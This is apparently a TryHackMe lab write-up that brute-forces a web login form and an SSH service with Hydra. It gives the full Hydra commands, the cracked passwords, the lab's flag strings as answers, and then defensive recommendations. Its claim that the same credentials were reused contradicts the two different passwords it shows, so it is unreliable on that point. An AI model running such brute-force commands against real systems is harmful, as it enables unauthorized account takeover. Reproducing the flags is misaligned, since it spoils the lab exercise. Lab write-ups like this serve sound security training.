# 🔐 Hydra Brute Force Attack Walkthrough (TryHackMe)

## 📌 Objective
This lab demonstrates how to use Hydra to perform brute-force attacks on a web login page and an SSH service to retrieve flags from the target system.

## 🖥️ Lab Environment
Platform: TryHackMe  
Attacker Machine: Kali Linux  
Target IP: 10.48.138.130  
Wordlist: /usr/share/wordlists/rockyou.txt  

## 🌐 Step 1: Access Web Login Page
Open browser and navigate to:
http://10.48.138.130/login

Observation:
- Login form requires username and password
- Error message shown: "Your username or password is incorrect."
- This message is used in Hydra as a failure condition

## 💣 Step 2: Brute Force Web Login
Command used:
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.48.138.130 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."

Explanation:
- -l molly → target username
- -P rockyou.txt → password wordlist
- http-post-form → web brute-force module
- ^USER^ and ^PASS^ → placeholders
- F= → failure message detection

Result:
[80][http-post-form] host: 10.48.138.130   login: molly   password: sunshine

## ✅ Step 3: Login to Web Application
Credentials found:
Username: molly  
Password: sunshine  

## 🚩 Step 4: Capture Flag 1
THM{2673a7dd116de68e85c48ec0b1f2612e}

## 💣 Step 5: Brute Force SSH
Command used:
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.48.138.130 -t 4 ssh

Result:
[22][ssh] host: 10.48.138.130   login: molly   password: butterfly

## 🔐 Step 6: SSH Login
ssh molly@10.48.138.130

Password:
butterfly

## 🖥️ Step 7: System Access
After login:
Welcome to Ubuntu 20.04.6 LTS  
IPv4 address: 10.48.138.130  

## 📂 Step 8: List Files
ls

Output:
flag2.txt

## 📄 Step 9: Read Flag 2
cat flag2.txt

## 🚩 Step 10: Capture Flag 2
THM{c8eeb0468febbadea859baeb33b2541b}

## 🖼️ Screenshots Evidence
(Place images in /images folder in your repo)

![Flag 1]<img width="1915" height="1017" alt="Screenshot 2026-04-29 195234" src="https://github.com/user-attachments/assets/3faa6c5e-5cc8-48b9-aae4-a0b8da6f402a" />

![Hydra SSH]<img width="657" height="531" alt="Screenshot 2026-04-29 200203" src="https://github.com/user-attachments/assets/235212db-af3e-48a8-a060-6308d17c3e69" />

![Flag 2]<img width="646" height="514" alt="Screenshot 2026-04-29 200129" src="https://github.com/user-attachments/assets/3dd68dae-9563-4655-80ec-0faef3fae548" />
![THM ANSWER]<img width="1919" height="1020" alt="Screenshot 2026-04-29 200337" src="https://github.com/user-attachments/assets/7e1cc37d-b3a7-4bbf-83a3-8e02776704e7" />


## 🧠 Key Findings
- Weak passwords allowed brute-force attacks  
- No rate limiting or account lockout  
- Same credentials reused across services  
- System security is weak  

## ⚠️ Security Recommendations
- Enforce strong password policies  
- Implement account lockout  
- Apply rate limiting  
- Enable Multi-Factor Authentication (MFA)  
- Monitor login attempts  
- Keep systems updated  

## 🛠️ Tools Used
Hydra  
Kali Linux  
RockYou Wordlist  
SSH  

## ⚠️ Disclaimer
This project is for educational purposes only. Do not perform unauthorized attacks.

## 👨‍💻 Author
Isyhad Ismail
